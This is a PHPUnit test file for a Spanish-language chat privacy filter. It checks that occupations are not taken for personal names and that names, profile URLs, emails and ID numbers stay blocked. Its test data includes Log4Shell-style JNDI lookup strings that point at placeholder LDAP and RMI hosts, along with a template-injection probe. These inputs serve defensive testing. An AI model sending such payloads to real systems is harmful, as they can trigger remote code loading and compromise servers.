<?php

declare(strict_types=1);

namespace Tests\Unit;

use App\Support\FiltroPrivacidadChat;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

/**
 * Cierre funcional (05/11/2026): defectos residuales conocidos y casos representativos nuevos.
 * Identidades ficticias redactadas por el implementador. NO es una validación independiente
 * y no contiene textos de reservas restringidas.
 */
class FiltroPrivacidadCierreFuncionalTest extends TestCase
{
    /** Profesiones y ocupaciones tras «soy»: describen un rol, no entregan un nombre. */
    public static function ocupaciones(): iterable
    {
        yield 'residual auxiliar' => ['Soy auxiliar contable y necesito un curso de Excel financiero'];
        yield ['Soy auxiliar de enfermería, ¿tienen capacitaciones?'];
        yield ['Soy chef y quiero aprender a llevar inventarios en Excel'];
        yield ['Soy chofer de reparto, ¿hay cursos de computación básica?'];
        yield ['Soy policía y me interesa un curso de redes'];
        yield ['Soy arquitecto, ¿ofrecen AutoCAD?'];
        yield ['Soy maestra de primaria y busco capacitación en ofimática'];
        yield ['Soy fotógrafo independiente y quiero aprender Photoshop'];
        yield ['Soy alumno de secundaria, ¿qué cursos hay?'];
        yield ['Soy jefe de almacén y necesito controlar stock con Excel'];
        yield ['Soy obstetra y quiero un curso virtual'];
        yield ['Soy freelancer y necesito mantenimiento para mi laptop'];
        yield ['Mi hijo quiere programar videojuegos, ¿hay talleres?'];
    }

    #[DataProvider('ocupaciones')]
    public function test_una_ocupacion_no_se_confunde_con_un_nombre(string $texto): void
    {
        $this->assertNull((new FiltroPrivacidadChat)->motivoBloqueo($texto));
    }

    /** La ampliación del léxico no abre una vía para nombres reales junto a la ocupación. */
    public static function nombresJuntoAOcupacion(): iterable
    {
        yield ['Soy auxiliar Ernesto Quispilloclla y quiero el curso'];
        yield ['soy chef ramiro tantaleán bazán'];
        yield ['Soy la maestra Yolanda Chuquiruna Pérez'];
        yield ['El alumno Kevin Huamanchumo Rojas quiere matricularse'];
        yield ['soy fotógrafo, me llamo dionisio quiliche'];
        yield ['Mi perfil es linkedin.com/in/carlos-mendoza-ruiz'];
    }

    #[DataProvider('nombresJuntoAOcupacion')]
    public function test_un_nombre_junto_a_una_ocupacion_sigue_bloqueado(string $texto): void
    {
        $this->assertNotNull((new FiltroPrivacidadChat)->motivoBloqueo($texto));
    }

    /** Sondas técnicas: no son nombres; la capa de seguridad de Python las trata como manipulación. */
    public static function sondasTecnicas(): iterable
    {
        yield 'residual jndi' => ['${jndi:ldap://x.example/a}'];
        yield ['${jndi:rmi://servidor.example/obj}'];
        yield ['#{7*7}'];
    }

    #[DataProvider('sondasTecnicas')]
    public function test_una_sonda_tecnica_no_se_clasifica_como_nombre(string $texto): void
    {
        $this->assertNotSame('nombre_personal', (new FiltroPrivacidadChat)->motivoBloqueo($texto));
    }

    /** La exclusión técnica no exime nombres escritos como palabras ni identificadores. */
    public static function nombresEnTextoTecnico(): iterable
    {
        yield ['${jndi:ldap://x.example/a} soy Marcelino Ayasta Cotrina'];
        yield ['carlos:mendoza'];
        yield ['https://linkedin.com/in/carlos-mendoza-ruiz'];
        yield ['https://example.com/perfil/marcelino.ayasta'];
        yield ['${x} quispilloclla'];
        yield ['https://example.com/?dni=45871236'];
        yield ['mi correo es usuario.ficticio@example.com ${x}'];
    }

    /** Barrera de salida: texto editorial capitalizado frente a nombres de personas. */
    public static function salidas(): iterable
    {
        yield ['Aprende Excel con tablas dinamicas y formulas.', false];
        yield ['Curso Microsoft Office Avanzado', false];
        yield ['Taller de Redes Empresariales', false];
        yield ['Soporte y Mantenimiento Preventivo', false];
        yield ['Programacion con Python', false];
        yield ['Docente: Rosario Quispilloclla', true];
        yield ['Atendido por María Fernández', true];
        yield ['Ingeniero Carlos Mendoza dicta el curso', true];
        yield ['Contacto: Yolanda Chuquiruna', true];
        yield ['Isabel Montes', true];
        yield ['Rosa Campos', true];
        yield ['Bruno Alcalde Pinedo', true];
    }

    #[DataProvider('salidas')]
    public function test_la_barrera_de_salida_distingue_texto_editorial_de_nombres(string $texto, bool $bloquear): void
    {
        $this->assertSame($bloquear, (new FiltroPrivacidadChat)->contieneDatosPrivadosEnRespuesta($texto));
    }

    #[DataProvider('nombresEnTextoTecnico')]
    public function test_un_nombre_o_identificador_en_texto_tecnico_sigue_bloqueado(string $texto): void
    {
        $this->assertNotNull((new FiltroPrivacidadChat)->motivoBloqueo($texto));
    }
}
